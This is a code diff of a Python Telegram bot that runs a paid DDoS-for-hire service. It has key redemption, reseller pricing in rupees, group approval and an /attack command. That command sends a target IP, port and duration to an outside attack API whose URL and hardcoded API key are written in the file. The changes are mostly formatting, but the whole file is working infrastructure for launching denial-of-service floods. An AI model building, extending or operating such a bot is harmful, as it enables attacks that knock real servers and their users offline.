@@ -35,7 +35,6 @@ try:
     bot_settings_collection = db['bot_settings']
     groups_collection = db['groups']
     cmd_media_collection = db['cmd_media']
-
     try:
         keys_collection.create_index('key', unique=True)
     except Exception as e:
@@ -44,7 +43,6 @@ try:
     resellers_collection.create_index('user_id', unique=True)
     bot_users_collection.create_index('user_id', unique=True)
     cmd_media_collection.create_index('command', unique=True)
-
     print("MongoDB connected successfully!", flush=True)
 except Exception as e:
     print(f"MongoDB connection error: {e}", flush=True)
@@ -54,12 +52,10 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 API_KEY = os.getenv("API_KEY", "mahakalda_d283ba18dc69dff43b189db84f1c19b19e32849e")
 API_BASE = os.getenv("API_BASE", "http://mahakaldak.duckdns.org/api/v1/attack/start")
-
 API_LIST = [
     f"{API_BASE}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}",
     f"{API_BASE}?key={API_KEY}&ip={{ip}}&port={{port}}&time={{duration}}",
 ]
-
 KEY_PREFIX = "@GAURAV_BHAI1-"
 REQUIRED_CHANNELS = ["https://t.me/DESTROYDDOSLODER"]
 
@@ -97,11 +93,7 @@ def get_setting(key, default):
         return default
 
 def set_setting(key, value):
-    bot_settings_collection.update_one(
-        {'key': key},
-        {'$set': {'key': key, 'value': value}},
-        upsert=True
-    )
+    bot_settings_collection.update_one({'key': key}, {'$set': {'key': key, 'value': value}}, upsert=True)
 
 def update_reseller_pricing():
     for dur in RESELLER_PRICING:
@@ -134,11 +126,6 @@ def get_group_cooldown():
         return int(get_setting('group_cooldown', DEFAULT_GROUP_COOLDOWN))
     except:
         return DEFAULT_GROUP_COOLDOWN
-
-def get_user_cooldown_setting(is_group=False):
-    if is_group:
-        return get_group_cooldown()
-    return get_private_cooldown()
 
 def get_concurrent_limit():
     try:
@@ -342,13 +329,7 @@ def check_channel_join(message):
             not_joined.append(f"@{channel_username}")
     if not_joined:
         channels_text = "\n".join([f"- {ch}" for ch in not_joined])
-        bot.reply_to(message,
-            f"PLEASE JOIN REQUIRED CHANNEL!\n\n"
-            f"Attack karne se pehle ye channel join karo:\n\n{channels_text}\n\n"
-            f"Join karne ke baad /verify use karke confirm karo.\n"
-            f"Phir /attack command use karo.\n\n"
-            f"Channel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}"
-        )
+        bot.reply_to(message, f"PLEASE JOIN REQUIRED CHANNEL!\n\nAttack karne se pehle ye channel join karo:\n\n{channels_text}\n\nJoin karne ke baad /verify use karke confirm karo.\nPhir /attack command use karo.\n\nChannel: {', '.join(REQUIRED_CHANNEL_USERNAMES)}")
         return False
     return True
 
@@ -360,13 +341,7 @@ def check_group_approval(message):
         return True
     if is_group_approved(chat_id):
         return True
-    bot.reply_to(message,
-        f"GROUP NOT APPROVED!\n\n"
-        f"This group is not approved for attacks.\n\n"
-        f"Group ID: {chat_id}\n\n"
-        f"Contact owner to approve this group.\n"
-        f"Owner can use: /addgrp {chat_id}"
-    )
+    bot.reply_to(message, f"GROUP NOT APPROVED!\n\nThis group is not approved for attacks.\n\nGroup ID: <code>{chat_id}</code>\n\nContact owner to approve this group.\nOwner can use: /addgrp {chat_id}", parse_mode="HTML")
     return False
 
 import threading as _threading
@@ -408,14 +383,7 @@ def clear_pending_feedback(user_id):
         del pending_feedback[user_id]
 
 def log_attack(user_id, username, target, port, duration):
-    attack_logs_collection.insert_one({
-        'user_id': user_id,
-        'username': username,
-        'target': target,
-        'port': port,
-        'duration': duration,
-        'timestamp': datetime.now()
-    })
+    attack_logs_collection.insert_one({'user_id': user_id, 'username': username, 'target': target, 'port': port, 'duration': duration, 'timestamp': datetime.now()})
 
 def generate_key(length=12):
     chars = string.ascii_uppercase + string.digits
@@ -594,11 +562,7 @@ def send_long_message(message, text, parse_mode=None):
 
 def track_bot_user(user_id, username=None):
     try:
-        bot_users_collection.update_one(
-            {'user_id': user_id},
-            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
-            upsert=True
-        )
+        bot_users_collection.update_one({'user_id': user_id}, {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}}, upsert=True)
     except:
         pass
 
@@ -610,18 +574,28 @@ def _call_single_api(slot_index, url, target, port, duration):
         print(f"[API Slot {slot_index+1}] Target: {target}:{port} | Error: {e}", flush=True)
 
 def generate_attack_start_ui(target, port, duration, user_name):
-    return f"ATTACK STARTED\n\nTarget: {target}:{port}\nDuration: {duration}s\nUser: {user_name}\n\n/status - Live Status\nStatus: ACTIVE"
+    return f'''🚀 <b>Attack Started!</b>
+
+📍 <code>{target} {port}</code>
+⏱ <b>Duration:</b> {duration}s
+👤 <b>Name :</b> {user_name}
+📊 <b>Monitor:</b> Type /status to see live progress'''
 
 def generate_attack_complete_ui(target, port, duration):
-    return f"ATTACK FINISHED\n\nTarget: {target}:{port}\nDuration: {duration}s\nStatus: COMPLETED\n\nPlease submit feedback"
+    return f'''✅ <b>Attack Finished!</b>
+
+📍 <code>{target} {port}</code>
+⏱ <b>Duration:</b> {duration}s
+⚡ <b>Status:</b> Completed
+
+📝 Please submit feedback'''
 
 def generate_global_status_ui():
     get_active_attack_count()
     attacks = list(active_attacks.items())
     if not attacks:
         return "No active attacks right now."
-
-    header = "ACTIVE ATTACKS STATUS\n----------------------"
+    header = "<b>ACTIVE ATTACKS STATUS</b>\n----------------------"
     body = ""
     for idx, (attack_id, info) in enumerate(attacks[:10], 1):
         remaining = (info['end_time'] - datetime.now()).total_seconds()
@@ -635,8 +609,7 @@ def generate_global_status_ui():
         bar = "#" * filled + "-" * empty
         user_id = info.get('user_id', 'Unknown')
         user_type = "Private" if not info.get('is_group', False) else "Group"
-
-        body += f"\nTarget: {info['target']}:{info['port']}\nRemaining: {int(remaining)}s | By: {user_id} ({user_type})\nProgress: {bar} {percent}%\n"
+        body += f"\n<b>Target:</b> <code>{info['target']} {info['port']}</code>\n<b>Remaining:</b> {int(remaining)}s | <b>By:</b> {user_id} ({user_type})\n<b>Progress:</b> {bar} {percent}%\n"
     footer = "----------------------"
     return header + body + footer
 
@@ -648,27 +621,19 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
         log_attack(user_id, username, target, port, duration)
         if not is_owner(user_id) and get_feedback_enabled():
             set_pending_feedback(user_id, target, port, duration)
-
         attack_start_msg = generate_attack_start_ui(target, port, duration, display_name)
-
         try:
             if get_reel_enabled():
                 reel_id = get_random_reel()
                 if reel_id:
-                    bot.send_video(
-                        message.chat.id,
-                        reel_id,
-                        caption=attack_start_msg,
-                        supports_streaming=True
-                    )
+                    bot.send_video(message.chat.id, reel_id, caption=attack_start_msg, supports_streaming=True, parse_mode="HTML")
                 else:
-                    bot.reply_to(message, attack_start_msg)
+                    bot.reply_to(message, attack_start_msg, parse_mode="HTML")
             else:
-                bot.reply_to(message, attack_start_msg)
+                bot.reply_to(message, attack_start_msg, parse_mode="HTML")
         except Exception as e:
             print(f"Reel send error: {e}")
-            bot.reply_to(message, attack_start_msg)
-
+            bot.reply_to(message, attack_start_msg, parse_mode="HTML")
         api_url = API_LIST[api_index].format(ip=target, port=port, duration=duration)
         try:
             t = threading.Thread(target=_call_single_api, args=(api_index, api_url, target, port, duration))
@@ -676,17 +641,14 @@ def start_attack(target, port, duration, message, attack_id, api_index, is_group
             t.start()
         except Exception as e:
             print(f"[API Slot {api_index+1}] Launch Error: {e}", flush=True)
-
         time.sleep(duration)
-
         with _attack_lock:
             if attack_id in active_attacks:
                 del active_attacks[attack_id]
             if attack_id in api_in_use:
                 del api_in_use[attack_id]
-
         complete_msg = generate_attack_complete_ui(target, port, duration)
-        bot.reply_to(message, complete_msg)
+        bot.reply_to(message, complete_msg, parse_mode="HTML")
     except Exception as e:
         print(f"start_attack error: {e}")
         with _attack_lock:
@@ -702,7 +664,6 @@ def _send_cmd_media(chat_id, file_id, file_type, caption=None, reply_to=None):
             kw['caption'] = caption
         if reply_to:
             kw['reply_to_message_id'] = reply_to
-
         if file_type == 'video':
             bot.send_video(chat_id, file_id, supports_streaming=True, **kw)
         elif file_type == 'document':
@@ -745,10 +706,8 @@ def _set_cmd_media(cmd, message):
     if not is_owner(message.from_user.id):
         bot.reply_to(message, "Ye command sirf owner use kar sakta hai!")
         return
-
     reply = message.reply_to_message
     file_id, file_type, caption = None, None, ""
-
     if reply:
         file_id, file_type, caption = _extract_media_from_reply(reply)
         if not file_id:
@@ -757,29 +716,11 @@ def _set_cmd_media(cmd, message):
     else:
         parts = message.text.split(maxsplit=1)
         if len(parts) < 2:
-            bot.reply_to(
-                message,
-                f"Usage:\n\n• Kisi video/file ko reply karke: /set{cmd}\n• Ya text ke liye: /set{cmd} Your text here"
-            )
+            bot.reply_to(message, f"Usage:\n\nKisi video/file ko reply karke: /set{cmd}\nYa text ke liye: /set{cmd} Your text here")
             return
         file_id, file_type = parts[1].strip(), 'text'
-
-    cmd_media_collection.update_one(
-        {'command': cmd},
-        {'$set': {
-            'command': cmd,
-            'file_id': file_id,
-            'file_type': file_type,
-            'caption': caption,
-            'set_by': message.from_user.id,
-            'set_at': datetime.now()
-        }},
-        upsert=True
-    )
-    bot.reply_to(
-        message,
-        f"{cmd.upper()} set ho gaya!\n\nType: {file_type}\nCaption: {caption[:80] if caption else 'None'}"
-    )
+    cmd_media_collection.update_one({'command': cmd}, {'$set': {'command': cmd, 'file_id': file_id, 'file_type': file_type, 'caption': caption, 'set_by': message.from_user.id, 'set_at': datetime.now()}}, upsert=True)
+    bot.reply_to(message, f"{cmd.upper()} set ho gaya!\n\nType: {file_type}\nCaption: {caption[:80] if caption else 'None'}")
 
 @bot.message_handler(commands=['setcanary'])
 def set_canary_command(message):
@@ -797,18 +738,11 @@ def _send_setup(cmd, message):
     if check_maintenance(message): return
     if check_banned(message): return
     if not check_channel_join(message): return
-
     entry = cmd_media_collection.find_one({'command': cmd})
     if not entry:
         bot.reply_to(message, f"{cmd.upper()} file abhi upload nahi hui. Please wait...")
         return
-    ok = _send_cmd_media(
-        message.chat.id,
-        entry['file_id'],
-        entry['file_type'],
-        caption=entry.get('caption') or None,
-        reply_to=message.message_id
-    )
+    ok = _send_cmd_media(message.chat.id, entry['file_id'], entry['file_type'], caption=entry.get('caption') or None, reply_to=message.message_id)
     if not ok:
         bot.reply_to(message, "File bhejne mein dikkat aayi.")
 
@@ -838,8 +772,7 @@ def setup_status_command(message):
             lines += f"OK /{cmd}\n   Type: {entry['file_type']}\n   Set: {when_str}\n\n"
         else:
             lines += f"NOT SET /{cmd}\n\n"
-    lines += "============\n"
-    lines += "Set: /setcanary /setios /setandroid"
+    lines += "============\nSet: /setcanary /setios /setandroid"
     bot.reply_to(message, lines)
 
 @bot.message_handler(commands=['delsetup'])
@@ -962,7 +895,7 @@ def verify_command(message):
 @bot.message_handler(commands=["id"])
 def id_command(message):
     if check_banned(message): return
-    bot.reply_to(message, f"{message.from_user.id}")
+    bot.reply_to(message, f"<code>{message.from_user.id}</code>", parse_mode="HTML")
 
 @bot.message_handler(commands=["ping"])
 def ping_command(message):
@@ -990,7 +923,6 @@ def generate_key_command(message):
     if check_banned(message): return
     user_id = message.from_user.id
     reseller = get_reseller(user_id)
-
     if is_owner(user_id):
         command_parts = message.text.split()
         if len(command_parts) != 3:
@@ -1012,32 +944,14 @@ def generate_key_command(message):
         generated_keys = []
         for _ in range(count):
             key = f"{KEY_PREFIX}{generate_key(12)}"
-            key_doc = {
-                'key': key,
-                'duration_seconds': int(duration.total_seconds()),
-                'duration_label': duration_label,
-                'created_at': datetime.now(),
-                'created_by': user_id,
-                'created_by_type': 'owner',
-                'used': False,
-                'used_by': None,
-                'used_at': None,
-                'max_users': 1
-            }
+            key_doc = {'key': key, 'duration_seconds': int(duration.total_seconds()), 'duration_label': duration_label, 'created_at': datetime.now(), 'created_by': user_id, 'created_by_type': 'owner', 'used': False, 'used_by': None, 'used_at': None, 'max_users': 1}
             keys_collection.insert_one(key_doc)
             generated_keys.append(key)
         if count == 1:
-            bot.reply_to(
-                message,
-                f"Key Generated!\n\nKey: /redeem {generated_keys[0]}\nDuration: {duration_label}"
-            )
+            bot.reply_to(message, f"<b>Key Generated!</b>\n\n<code>/redeem {generated_keys[0]}</code>\n\n<b>Duration:</b> {duration_label}", parse_mode="HTML")
         else:
-            keys_text = "\n".join([f"- /redeem {k}" for k in generated_keys])
-            bot.reply_to(
-                message,
-                f"{count} Keys Generated!\n\nKeys:\n{keys_text}\n\nDuration: {duration_label}"
-            )
-
+            keys_text = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
+            bot.reply_to(message, f"<b>{count} Keys Generated!</b>\n\n{keys_text}\n\n<b>Duration:</b> {duration_label}", parse_mode="HTML")
     elif reseller:
         if reseller.get('blocked'):
             bot.reply_to(message, "Aapka panel blocked hai!")
@@ -1069,48 +983,22 @@ def generate_key_command(message):
         generated_keys = []
         for _ in range(count):
             key = f"{KEY_PREFIX}{generate_key(12)}"
-            key_doc = {
-                'key': key,
-                'duration_seconds': pricing['seconds'],
-                'duration_label': pricing['label'],
-                'created_at': datetime.now(),
-                'created_by': user_id,
-                'created_by_username': username,
-                'created_by_type': 'reseller',
-                'used': False,
-                'used_by': None,
-                'used_at': None,
-                'max_users': 1
-            }
+            key_doc = {'key': key, 'duration_seconds': pricing['seconds'], 'duration_label': pricing['label'], 'created_at': datetime.now(), 'created_by': user_id, 'created_by_username': username, 'created_by_type': 'reseller', 'used': False, 'used_by': None, 'used_at': None, 'max_users': 1}
             keys_collection.insert_one(key_doc)
             generated_keys.append(key)
         new_balance = balance - total_price
         resellers_collection.update_one({'user_id': user_id}, {'$set': {'balance': new_balance}, '$inc': {'total_keys_generated': count}})
         try:
-            keys_list_str = "\n".join([f"/redeem {k}" for k in generated_keys])
-            owner_msg = (
-                f"Reseller Key Notification\n\n"
-                f"Reseller: {username} ({user_id})\n"
-                f"Keys Generated: {count}\n"
-                f"Duration: {pricing['label']}\n"
-                f"Total Cost: {total_price} Rs\n"
-                f"Remaining Balance: {new_balance} Rs\n\n"
-                f"Keys:\n{keys_list_str}"
-            )
-            bot.send_message(BOT_OWNER, owner_msg)
+            keys_list_str = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
+            owner_msg = f"<b>Reseller Key Notification</b>\n\n<b>Reseller:</b> {username} ({user_id})\n<b>Keys Generated:</b> {count}\n<b>Duration:</b> {pricing['label']}\n<b>Total Cost:</b> {total_price} Rs\n<b>Remaining Balance:</b> {new_balance} Rs\n\n<b>Keys:</b>\n{keys_list_str}"
+            bot.send_message(BOT_OWNER, owner_msg, parse_mode="HTML")
         except Exception as e:
             print(f"Failed to notify owner: {e}")
         if count == 1:
-            bot.reply_to(
-                message,
-                f"Key Generated!\n\nKey: /redeem {generated_keys[0]}\nDuration: {pricing['label']}\nBalance: {new_balance} Rs"
-            )
+            bot.reply_to(message, f"<b>Key Generated!</b>\n\n<code>/redeem {generated_keys[0]}</code>\n\n<b>Duration:</b> {pricing['label']}\n<b>Balance:</b> {new_balance} Rs", parse_mode="HTML")
         else:
-            keys_text = "\n".join([f"- /redeem {k}" for k in generated_keys])
-            bot.reply_to(
-                message,
-                f"{count} Keys Generated!\n\nKeys:\n{keys_text}\n\nDuration: {pricing['label']}\nCost: {total_price} Rs\nBalance: {new_balance} Rs"
-            )
+            keys_text = "\n".join([f"<code>/redeem {k}</code>" for k in generated_keys])
+            bot.reply_to(message, f"<b>{count} Keys Generated!</b>\n\n{keys_text}\n\n<b>Duration:</b> {pricing['label']}\n<b>Cost:</b> {total_price} Rs\n<b>Balance:</b> {new_balance} Rs", parse_mode="HTML")
     else:
         bot.reply_to(message, "Ye command sirf owner/reseller use kar sakta hai!")
 
@@ -1132,15 +1020,7 @@ def add_reseller_command(message):
     if existing:
         bot.reply_to(message, "Ye user pehle se reseller hai!")
         return
-    reseller_doc = {
-        'user_id': reseller_id,
-        'username': resolved_name,
-        'balance': 0,
-        'added_at': datetime.now(),
-        'added_by': user_id,
-        'blocked': False,
-        'total_keys_generated': 0
-    }
+    reseller_doc = {'user_id': reseller_id, 'username': resolved_name, 'balance': 0, 'added_at': datetime.now(), 'added_by': user_id, 'blocked': False, 'total_keys_generated': 0}
     resellers_collection.insert_one(reseller_doc)
     try:
         bot.send_message(reseller_id, "Congratulations! Aap ab Reseller ban gaye ho!\n\nUse /mysaldo to check balance\nUse /gen to generate keys\nUse /prices to see pricing")
@@ -1414,7 +1294,7 @@ def add_group_command(message):
         bot.reply_to(message, "Invalid group ID!")
         return
     if add_approved_group(group_id):
-        bot.reply_to(message, f"Group Approved!\n\nGroup ID: {group_id}\n\nNow all members can attack in this group without key!\nMax Time: {get_group_max_attack_time()}s\nCooldown: {get_group_cooldown()}s\nDDoS: {'ON' if get_ddos_protection() else 'OFF'}\nChannel: {'Required' if get_channel_required() else 'Not Required'}\nMax Slots: {len(API_LIST)}")
+        bot.reply_to(message, f"Group Approved!\n\nGroup ID: <code>{group_id}</code>\n\nNow all members can attack in this group without key!\nMax Time: {get_group_max_attack_time()}s\nCooldown: {get_group_cooldown()}s\nDDoS: {'ON' if get_ddos_protection() else 'OFF'}\nChannel: {'Required' if get_channel_required() else 'Not Required'}\nMax Slots: {len(API_LIST)}", parse_mode="HTML")
     else:
         bot.reply_to(message, f"Group {group_id} already approved!")
 
@@ -1433,7 +1313,7 @@ def remove_group_command(message):
         bot.reply_to(message, "Invalid group ID!")
         return
     if remove_approved_group(group_id):
-        bot.reply_to(message, f"Group Removed!\n\nGroup ID: {group_id}")
+        bot.reply_to(message, f"Group Removed!\n\nGroup ID: <code>{group_id}</code>", parse_mode="HTML")
     else:
         bot.reply_to(message, f"Group {group_id} not found!")
 
@@ -1473,11 +1353,11 @@ def groups_command(message):
     if approved:
         response += f"Total: {len(approved)}\n\n"
         for i, gid in enumerate(approved, 1):
-            response += f"{i}. {gid}\n"
+            response += f"{i}. <code>{gid}</code>\n"
     else:
         response += "No groups approved!\n"
     response += "\n===============\nCommands:\n- /addgrp <id>\n- /removegrp <id>"
-    bot.reply_to(message, response)
+    bot.reply_to(message, response, parse_mode="HTML")
 
 @bot.message_handler(commands=["private_max"])
 def private_max_command(message):
@@ -1603,28 +1483,10 @@ def reseller_trail_command(message):
         except:
             reseller_username = str(reseller_id)
         key = f"{KEY_PREFIX}{generate_key(12)}"
-        key_doc = {
-            'key': key,
-            'duration_seconds': hours * 3600,
-            'duration_label': f"{hours} hours (Reseller Trail)",
-            'created_at': datetime.now(),
-            'created_by': message.from_user.id,
-            'created_by_username': reseller_username,
-            'created_by_type': 'reseller_trail',
-            'used': False,
-            'used_by': None,
-            'used_at': None,
-            'max_users': max_users,
-            'current_users': 0,
-            'is_trail': True,
-            'reseller_id': reseller_id
-        }
+        key_doc = {'key': key, 'duration_seconds': hours * 3600, 'duration_label': f"{hours} hours (Reseller Trail)", 'created_at': datetime.now(), 'created_by': message.from_user.id, 'created_by_username': reseller_username, 'created_by_type': 'reseller_trail', 'used': False, 'used_by': None, 'used_at': None, 'max_users': max_users, 'current_users': 0, 'is_trail': True, 'reseller_id': reseller_id}
         keys_collection.insert_one(key_doc)
         try:
-            bot.send_message(
-                reseller_id,
-                f"Trail Key Generated!\n\nKey: /redeem {key}\nDuration: {hours} hours\nMax Users: {max_users}\n\nBot - @BGMIXPOWERBOT\n\nYe key {max_users} users use kar sakte hai.\nCopy karke directly redeem kar sakte ho."
-            )
+            bot.send_message(reseller_id, f"<b>Trail Key Generated!</b>\n\n/redeem <code>{key}</code>\n\n<b>Duration:</b> {hours} hours\n<b>Max Users:</b> {max_users}\n\nBot - @BGMIXPOWERBOT\n\n<i>Ye key {max_users} users use kar sakte hai.</i>\n<i>Key pe tap karke copy karo, phir /redeem me paste karo.</i>", parse_mode="HTML")
             sent_count += 1
         except:
             pass
@@ -1652,28 +1514,10 @@ def owner_trail_command(message):
     except ValueError:
         bot.reply_to(message, "Invalid max_users!")
         return
-
     key = f"{KEY_PREFIX}{generate_key(12)}"
-    key_doc = {
-        'key': key,
-        'duration_seconds': int(duration.total_seconds()),
-        'duration_label': f"{duration_label} (Owner Trail)",
-        'created_at': datetime.now(),
-        'created_by': message.from_user.id,
-        'created_by_type': 'owner_trail',
-        'used': False,
-        'used_by': None,
-        'used_at': None,
-        'max_users': max_users,
-        'current_users': 0,
-        'is_trail': True
-    }
+    key_doc = {'key': key, 'duration_seconds': int(duration.total_seconds()), 'duration_label': f"{duration_label} (Owner Trail)", 'created_at': datetime.now(), 'created_by': message.from_user.id, 'created_by_type': 'owner_trail', 'used': False, 'used_by': None, 'used_at': None, 'max_users': max_users, 'current_users': 0, 'is_trail': True}
     keys_collection.insert_one(key_doc)
-
-    bot.reply_to(
-        message,
-        f"Trail Key Generated!\n\nKey: /redeem {key}\nDuration: {duration_label}\nMax Users: {max_users}\n\nBot - @BGMIXPOWERBOT\n\nYe key {max_users} users use kar sakte hai.\nCopy karke directly redeem kar sakte ho."
-    )
+    bot.reply_to(message, f"<b>Trail Key Generated!</b>\n\n/redeem <code>{key}</code>\n\n<b>Duration:</b> {duration_label}\n<b>Max Users:</b> {max_users}\n\nBot - @BGMIXPOWERBOT\n\n<i>Ye key {max_users} users use kar sakte hai.</i>\n<i>Key pe tap karke copy karo, phir /redeem me paste karo.</i>", parse_mode="HTML")
 
 @bot.message_handler(commands=["user_resell"])
 def user_resell_command(message):
@@ -1697,9 +1541,9 @@ def user_resell_command(message):
     for i, key in enumerate(keys[:15], 1):
         user = users_collection.find_one({'key': key['key']})
         if user:
-            response += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {key['key']}\n\n"
+            response += f"{i}. {user.get('username', 'Unknown')}\n   ID: <code>{user['user_id']}</code>\n   Key: <code>{key['key']}</code>\n\n"
     response += f"==========\nTotal Users: {len(keys)}"
-    bot.reply_to(message, response)
+    bot.reply_to(message, response, parse_mode="HTML")
 
 pending_broadcast = {}
 pending_broadcast_reseller = {}
@@ -1863,7 +1707,7 @@ def redeem_key_command(message):
     key_input = command_parts[1].strip()
     key_doc = keys_collection.find_one({'key': key_input})
     if not key_doc:
-        bot.reply_to(message, f"Invalid key!\n\nTumne di: {key_input}")
+        bot.reply_to(message, f"Invalid key!\n\nTumne di: <code>{key_input}</code>", parse_mode="HTML")
         return
     max_users = key_doc.get('max_users', 1)
     current_users = key_doc.get('current_users', 0)
@@ -1887,40 +1731,24 @@ def redeem_key_command(message):
     reseller_username = key_doc.get('created_by_username') if key_doc.get('created_by_type') == 'reseller' else None
     if user and user.get('key_expiry') and user['key_expiry'] > datetime.now():
         new_expiry = user['key_expiry'] + timedelta(seconds=key_doc['duration_seconds'])
-        users_collection.update_one({'user_id': user_id}, {'$set': {
-            'key': key_input,
-            'key_expiry': new_expiry,
-            'key_duration_seconds': key_doc['duration_seconds'],
-            'key_duration_label': key_doc['duration_label'],
-            'redeemed_at': datetime.now(),
-            'reseller_username': reseller_username
-        }})
+        users_collection.update_one({'user_id': user_id}, {'$set': {'key': key_input, 'key_expiry': new_expiry, 'key_duration_seconds': key_doc['duration_seconds'], 'key_duration_label': key_doc['duration_label'], 'redeemed_at': datetime.now(), 'reseller_username': reseller_username}})
         new_current = current_users + 1
         if new_current >= max_users:
             keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
         else:
             keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
         new_remaining = get_time_remaining(user_id)
-        bot.reply_to(message, f"Key Extended!\n\nKey: {key_input}\nAdded: {key_doc['duration_label']}\nTotal Time: {new_remaining}")
+        bot.reply_to(message, f"<b>Key Extended!</b>\n\n<b>Key:</b> <code>{key_input}</code>\n<b>Added:</b> {key_doc['duration_label']}\n<b>Total Time:</b> {new_remaining}", parse_mode="HTML")
     else:
         expiry_time = datetime.now() + timedelta(seconds=key_doc['duration_seconds'])
-        users_collection.update_one({'user_id': user_id}, {'$set': {
-            'user_id': user_id,
-            'username': user_name,
-            'key': key_input,
-            'key_expiry': expiry_time,
-            'key_duration_seconds': key_doc['duration_seconds'],
-            'key_duration_label': key_doc['duration_label'],
-            'redeemed_at': datetime.now(),
-            'reseller_username': reseller_username
-        }}, upsert=True)
+        users_collection.update_one({'user_id': user_id}, {'$set': {'user_id': user_id, 'username': user_name, 'key': key_input, 'key_expiry': expiry_time, 'key_duration_seconds': key_doc['duration_seconds'], 'key_duration_label': key_doc['duration_label'], 'redeemed_at': datetime.now(), 'reseller_username': reseller_username}}, upsert=True)
         new_current = current_users + 1
         if new_current >= max_users:
             keys_collection.update_one({'key': key_input}, {'$set': {'used': True, 'used_by': user_id, 'used_at': datetime.now(), 'current_users': new_current}})
         else:
             keys_collection.update_one({'key': key_input}, {'$set': {'used_at': datetime.now()}, '$inc': {'current_users': 1}})
         remaining = get_time_remaining(user_id)
-        bot.reply_to(message, f"Key Redeemed!\n\nKey: {key_input}\nDuration: {key_doc['duration_label']}\nTime Left: {remaining}")
+        bot.reply_to(message, f"<b>Key Redeemed!</b>\n\n<b>Key:</b> <code>{key_input}</code>\n<b>Duration:</b> {key_doc['duration_label']}\n<b>Time Left:</b> {remaining}", parse_mode="HTML")
 
 @bot.message_handler(commands=["mykey"])
 def my_key_command(message):
@@ -1939,7 +1767,7 @@ def my_key_command(message):
             bot.reply_to(message, "Key khatam ho gayi!")
         return
     remaining = get_time_remaining(user_id)
-    bot.reply_to(message, f"Key Details\n\nKey: {user['key']}\nRemaining: {remaining}\nStatus: Active")
+    bot.reply_to(message, f"<b>Key Details</b>\n\n<b>Key:</b> <code>{user['key']}</code>\n<b>Remaining:</b> {remaining}\n<b>Status:</b> Active", parse_mode="HTML")
 
 @bot.message_handler(commands=["status"])
 def status_command(message):
@@ -1950,7 +1778,7 @@ def status_command(message):
         bot.reply_to(message, "Pehle key purchase karo!")
         return
     response = generate_global_status_ui()
-    sent_msg = bot.reply_to(message, response)
+    sent_msg = bot.reply_to(message, response, parse_mode="HTML")
     def update_status_loop():
         for _ in range(30):
             time.sleep(2)
@@ -1958,7 +1786,7 @@ def status_command(message):
                 break
             new_response = generate_global_status_ui()
             try:
-                bot.edit_message_text(new_response, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id)
+                bot.edit_message_text(new_response, chat_id=sent_msg.chat.id, message_id=sent_msg.message_id, parse_mode="HTML")
             except:
                 break
     if active_attacks:
@@ -2085,7 +1913,7 @@ def delete_key_command(message):
     result = keys_collection.delete_one({'key': key_input})
     if result.deleted_count > 0:
         users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
-        bot.reply_to(message, f"Key {key_input} deleted!")
+        bot.reply_to(message, f"Key <code>{key_input}</code> deleted!", parse_mode="HTML")
     else:
         bot.reply_to(message, "Key nahi mili!")
 
@@ -2102,7 +1930,7 @@ def delete_key_alt_command(message):
     result = keys_collection.delete_one({'key': key_input})
     if result.deleted_count > 0:
         users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
-        bot.reply_to(message, f"Key {key_input} deleted!")
+        bot.reply_to(message, f"Key <code>{key_input}</code> deleted!", parse_mode="HTML")
     else:
         bot.reply_to(message, "Key nahi mili!")
 
@@ -2121,7 +1949,7 @@ def key_details_command(message):
         bot.reply_to(message, "Key nahi mili!")
         return
     response = "KEY DETAILS\n===========\n\n"
-    response += f"Key: {key_input}\nDuration: {key_doc.get('duration_label', 'Unknown')}\nSeconds: {key_doc.get('duration_seconds', 0)}\nCreated: {key_doc.get('created_at', 'Unknown')}\n"
+    response += f"Key: <code>{key_input}</code>\nDuration: {key_doc.get('duration_label', 'Unknown')}\nSeconds: {key_doc.get('duration_seconds', 0)}\nCreated: {key_doc.get('created_at', 'Unknown')}\n"
     creator_type = key_doc.get('created_by_type', 'owner')
     if creator_type == 'reseller':
         creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
@@ -2130,10 +1958,10 @@ def key_details_command(message):
         response += f"Creator: OWNER\n"
     response += f"\nStatus: {'USED' if key_doc.get('used') else 'UNUSED'}\n"
     if key_doc.get('used'):
-        response += f"Used By: {key_doc.get('used_by', 'Unknown')}\nUsed At: {key_doc.get('used_at', 'Unknown')}\n"
+        response += f"Used By: <code>{key_doc.get('used_by', 'Unknown')}</code>\nUsed At: {key_doc.get('used_at', 'Unknown')}\n"
         user = users_collection.find_one({'key': key_input})
         if user:
-            response += f"\n--- USER INFO ---\nUsername: {user.get('username', 'Unknown')}\nID: {user.get('user_id', 'Unknown')}\n"
+            response += f"\n--- USER INFO ---\nUsername: {user.get('username', 'Unknown')}\nID: <code>{user.get('user_id', 'Unknown')}</code>\n"
             expiry = user.get('key_expiry')
             if expiry:
                 if expiry > datetime.now():
@@ -2142,7 +1970,7 @@ def key_details_command(message):
                 else:
                     response += f"Status: EXPIRED\n"
     response += "\n==========="
-    bot.reply_to(message, response)
+    bot.reply_to(message, response, parse_mode="HTML")
 
 @bot.message_handler(commands=["allkeys"])
 def list_keys_command(message):
@@ -2343,7 +2171,6 @@ def handle_attack(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
     is_group = message.chat.type not in ['private', 'personal']
-
     if is_group:
         if not check_group_approval(message):
             return
@@ -2355,17 +2182,15 @@ def handle_attack(message):
             else:
                 bot.reply_to(message, "Tumhare paas valid key nahi hai!\nKey kharidne ke liye reseller se contact karo.")
             return
-
     if protection.is_ddos_attack(user_id, message.chat.id):
         bot.reply_to(message, "DDoS Protection: Too many requests! Wait 5 seconds.")
         return
     if not check_channel_join(message):
         return
-
     if get_feedback_enabled() and not is_owner(user_id):
         fb = get_pending_feedback(user_id)
         if fb:
